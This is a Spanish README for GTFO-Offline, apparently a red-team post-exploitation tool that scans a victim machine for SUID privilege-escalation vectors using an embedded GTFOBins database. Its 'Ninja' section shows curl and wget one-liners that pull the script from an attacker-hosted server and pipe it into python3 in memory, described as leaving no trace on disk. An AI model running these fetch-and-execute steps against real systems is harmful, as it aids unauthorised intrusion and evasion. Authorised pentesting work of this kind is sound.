# 🚀 GTFO-Offline

**GTFO-Offline** es una herramienta de post-explotación diseñada para Red Teamers y Pentesters. Permite consultar la base de datos de [GTFOBins](https://gtfobins.github.io/) de forma local y automatizada, ideal para entornos **Air-Gapped** o situaciones donde la discreción es clave.

Con un solo archivo empaquetado, puedes escanear una máquina víctima en busca de vectores de escalada de privilegios SUID sin dejar rastro en el disco duro.

---

# 🛠️ Preparación (En tu máquina de ataque)

Antes de cada intervención, es vital tener la base de datos actualizada. Sigue estos pasos en tu máquina local:

# Manejo del Entorno de Python

Se recomienda encarecidamente utilizar un entorno virtual para mantener limpias las dependencias de tu sistema.

1. **Crear el entorno virtual:**
```bash
python3 -m venv venv
```

2. **Activa tu entorno virtual (opcional pero recomendado):**
   ```bash
   source venv/bin/activate
   ```

# Actualiza la base de datos:

GTFOBins se actualiza constantemente. Corre el builder para obtener los últimos 450+ binarios:

```bash
python3 builder.py
```

# Genera el ejecutable Standalone:

Crea el archivo único que contiene la lógica y la DB embebida:

```bash
python3 pack.py
```

      Esto generará el archivo gtfo_final.py.

# 🎯 Uso en la Máquina Víctima

Opción A: Ejecución "Ninja" (En Memoria - Recomendado) 🥷

No necesitas subir archivos. Sirve el script desde tu máquina y ejecútalo directamente en la RAM de la víctima.

# En tu máquina:

```bash
sudo python3 -m http.server 80
```

En la víctima (usando curl):

```bash
curl -s http://<TU_IP>/gtfo_final.py | python3 - --scan
```

En la víctima (usando wget):

```bash
wget -qO- http://<TU_IP>/gtfo_final.py | python3 - --scan
```

# Opción B: Ejecución Local

Si prefieres subir el archivo manualmente:

```bash
python3 gtfo_final.py --scan
```

# Opción C: Consulta Manual

También puedes usarlo como un diccionario rápido para buscar un binario específico:

```bash
python3 gtfo_final.py find sudo
```

# 📂 Estructura del Proyecto

    builder.py: Sincroniza y parsea los datos desde el repo oficial de GTFOBins.

    gtfo_db.json: La base de datos local en formato JSON.

    pack.py: Script que embebe la DB en el buscador para crear el ejecutable único.

    gtfo_final.py: Tu navaja suiza lista para la acción.

    gtfo.py: El buscador modular original.

# ⚠️ Requisitos

    Máquina de ataque: Python 3.x, pyyaml, requests.

    Máquina víctima: Python 3.x (Sin librerías externas).

Desarrollado con fines educativos y de auditoría profesional.
